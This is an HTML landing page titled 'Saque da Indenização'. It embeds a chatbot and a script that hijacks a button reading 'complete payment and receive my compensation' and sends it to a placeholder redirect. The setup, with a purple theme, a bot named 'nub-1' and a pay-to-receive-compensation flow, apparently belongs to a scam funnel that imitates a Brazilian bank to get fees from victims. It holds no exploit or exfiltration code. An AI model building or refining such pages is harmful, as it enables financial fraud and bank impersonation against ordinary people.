<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Saque da Indenização</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-[#831BD1] min-h-screen flex flex-col">
  <!-- Seu conteúdo existente -->

  <script type="module">
    import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';

    async function initializeTypebot() {
      try {
        await Typebot.initStandard({
          typebot: "nub-1-mcrdbzs",
          apiHost: "https://chat.typezap.site",
        });
        
        console.log('Typebot carregado - Iniciando interceptação específica');
        initSpanButtonInterceptor();
      } catch (error) {
        console.error('Erro ao carregar Typebot:', error);
        setTimeout(initializeTypebot, 1000);
      }
    }

    initializeTypebot();
  </script>

  <script>
  // CONFIGURAÇÃO ESPECÍFICA
  const TARGET_SPAN_TEXT = "Concluir pagamento e receber minha indenização";
  const REDIRECT_URL = "https://google.com";
  const CHECK_INTERVAL = 300;

  // FUNÇÃO PRINCIPAL DE INTERCEPTAÇÃO
  function initSpanButtonInterceptor() {
    // 1. Observador de mutações
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.addedNodes.length) {
          checkForTargetSpan();
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });

    // 2. Verificação periódica
    const intervalId = setInterval(checkForTargetSpan, CHECK_INTERVAL);

    // 3. Verificação inicial
    checkForTargetSpan();

    console.log('🔍 Procurando por span com texto:', TARGET_SPAN_TEXT);

    // Limpeza após 5 minutos
    setTimeout(() => {
      clearInterval(intervalId);
      observer.disconnect();
      console.log('⏱ Monitoramento finalizado');
    }, 300000);
  }

  // VERIFICA O SPAN ESPECÍFICO
  function checkForTargetSpan() {
    try {
      // Encontra todos os spans com a classe específica
      const spans = document.querySelectorAll('span.px-\\[15px\\].py-\\[7px\\]');
      
      spans.forEach(span => {
        if (span.textContent.trim() === TARGET_SPAN_TEXT) {
          const button = findParentButton(span);
          if (button && !button.dataset.intercepted) {
            transformButton(button);
          }
        }
      });

      // Verifica no Shadow DOM também
      const typebot = document.querySelector('typebot-standard');
      if (typebot?.shadowRoot) {
        const shadowSpans = typebot.shadowRoot.querySelectorAll('span');
        shadowSpans.forEach(span => {
          if (span.textContent.trim() === TARGET_SPAN_TEXT) {
            const button = findParentButton(span);
            if (button && !button.dataset.intercepted) {
              transformButton(button);
            }
          }
        });
      }
    } catch (e) {
      console.error('Erro na verificação:', e);
    }
  }

  // ENCONTRA O BOTÃO PAI DO SPAN
  function findParentButton(element) {
    let parent = element.parentElement;
    while (parent) {
      if (parent.tagName === 'BUTTON' || parent.tagName === 'A' || parent.hasAttribute('onclick')) {
        return parent;
      }
      parent = parent.parentElement;
    }
    return null;
  }

  // TRANSFORMA O BOTÃO
  function transformButton(button) {
    try {
      button.dataset.intercepted = 'true';
      
      // Se for um link
      if (button.tagName === 'A') {
        button.href = REDIRECT_URL;
        button.target = '_blank';
      }
      
      // Remove eventos antigos
      const newButton = button.cloneNode(true);
      button.parentNode.replaceChild(newButton, button);
      
      // Adiciona novo comportamento
      newButton.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        console.log('✅ Redirecionando botão com span:', TARGET_SPAN_TEXT);
        window.open(REDIRECT_URL, '_blank');
      }, true);
      
      console.log('🔄 Botão com span transformado:', newButton);
    } catch (e) {
      console.error('Erro ao transformar botão:', e);
    }
  }

  // FERRAMENTAS DE DEPURAÇÃO
  window.spanInterceptor = {
    checkSpans: () => {
      const spans = document.querySelectorAll('span');
      console.log('📋 Todos os spans:', spans);
      return spans;
    },
    test: () => {
      const testSpan = document.createElement('span');
      testSpan.className = 'px-[15px] py-[7px]';
      testSpan.textContent = TARGET_SPAN_TEXT;
      document.body.appendChild(testSpan);
      console.log('🧪 Span de teste adicionado');
    }
  };
  </script>
</body>
</html>
